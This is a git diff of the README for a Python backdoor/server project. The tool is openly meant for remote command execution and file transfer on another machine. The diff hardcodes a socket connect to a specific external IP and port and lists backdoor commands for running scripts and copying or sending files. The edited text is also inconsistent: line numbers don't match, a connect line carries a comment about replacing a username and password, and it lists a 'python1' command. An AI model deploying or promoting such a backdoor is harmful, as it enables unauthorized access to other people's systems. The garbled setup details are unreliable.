@@ -1,4 +1,4 @@
-## Backdoor-And-Serverr 🖥️🔍
+## Backdoor-And-Server 🖥️🔍
 
 This is a simple server-client Python application that allows you to remotely execute basic commands on the server from the backdoor. 
 
@@ -17,32 +17,32 @@ The author of this project are not responsible for any misuse or illegal activit
 
 ## Installation Process 📥
 
-First, clone the repository and navigate to the Keylogger directory:
+First, clone the repository and navigate to the Backdoor-And-Server directory:
 
 ```
 $ git clone https://github.com/Advaidv121/Backdoor-And-Server && cd Backdoor-And-Server
 ```
 
-Next, install Keylogger using pip3 with the following instructions:
+Next, install the requrements using pip3 with the following instructions:
 
 For **Server.py**
 ```
-$ pip install -r requirements.txt
+$ pip3 install -r requirements.txt
 ```
 For **Backdoor.py**
 ```
-$ pip install -r requirements.txt
+$ pip3 install -r requirements.txt
 ```
 
 ## Pre Execution ⏮️
 
-On line number **36** of **server.py** file
+On line number **120** of **server.py** file
 ```
-36. ftp=FTP('xx.xxx.xx.xx') #replace 'xx.xxx.xx.xx'
+36. sock.bind(('xx.xxx.xx.xx',xxxx)) #replace 'xx.xxx.xx.xx'
 ```
-On line number **36** of **backdoor.py** file
+On line number **160** of **backdoor.py** file
 ```
-37. ftp.login('username','password')  #replace 'username' 'password'
+160. s.connect(('68.183.89.11',5555))  #replace 'username' 'password'
 ```
 
 ## Execution 🏃‍♂️
@@ -61,14 +61,21 @@ This will establish a connection with the server, and you can start sending comm
 
 Here's a table of the commands you can run on the server from the client:
 
-| Command     | Description                   |
-|-------------|-------------------------------|
-| `ls`        | List files and directories    |
-| `pwd`       | Print current working directory |
-| `cd <dir>`  | Change current directory       |
-| `cat <file>`| Display the contents of a file|
-| `help`      | Show available commands       |
-| `exit`      | Terminate the connection      |
+| Command                | Description                                                     |
+|------------------------|-----------------------------------------------------------------|
+| `ls`                   | List the files and directories in the current directory.        |
+| `cd <foldername>`      | Change the current directory to the specified folder.           |
+| `cd ..`                | Navigate to the parent directory.                               |
+| `pwd`                  | Print the current working directory.                            |
+| `cat`                  | Display the contents of a text file.                            |
+| `python1 <filename>`   | Execute a Python 1.x script with the specified filename.        |
+| `python3 <filename>`   | Execute a Python 3.x script with the specified filename.        |
+| `copy <filename>`      | Copy a file from the client to the server.                      |
+| `bye`                  | Disconnect from the server.                                     |
+| `scrst`                | Command description not provided.                               |
+| `send <filename>`      | Send a file to the server.                                      |
+| `help`                 | Display a list of available commands.                           |
+
 
 
 ## Potential Uses 💡
